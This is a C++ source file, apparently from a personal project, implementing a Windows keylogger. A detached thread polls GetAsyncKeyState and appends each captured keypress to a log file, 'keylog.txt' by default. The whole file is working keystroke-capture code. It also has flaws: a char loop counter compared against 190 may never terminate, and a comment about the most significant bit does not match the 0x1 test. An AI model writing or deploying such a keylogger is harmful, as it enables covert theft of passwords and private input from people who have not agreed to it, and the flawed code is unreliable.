//
// Created by actua on 5/21/2024.
//

#include "../include/Keylog.h"
#include "../include/FileHandler.h"
#include <windows.h>
#include <thread>

KeyLog::KeyLog(const std::string& fname = "keylog.txt") : keyHandler(fname), running(true),fileHandler(fname) {}

// Log the key to the file
void KeyLog::start() {
  // Start the thread
  std::thread logThread(&KeyLog::logLoop, this);
  // Wait for the thread to finish
  logThread.detach();
}

void KeyLog::stop() {
  running = false;
}


void KeyLog::logLoop() {
  while (running) {
    // Check each key
    for (char c = 8; c <= 190; c++) {
      // If the key is pressed, the most significant bit is set
      if (GetAsyncKeyState(c) & 0x1) {
        // Translate the key into a string for logging
        std::string k = Key::translateKey(c);
        // write the key to the file
        fileHandler.write(k);
      }
    }
    // small delay to prevent high CPU usage and to allow the thread to be joined
    Sleep(10);
  }
}




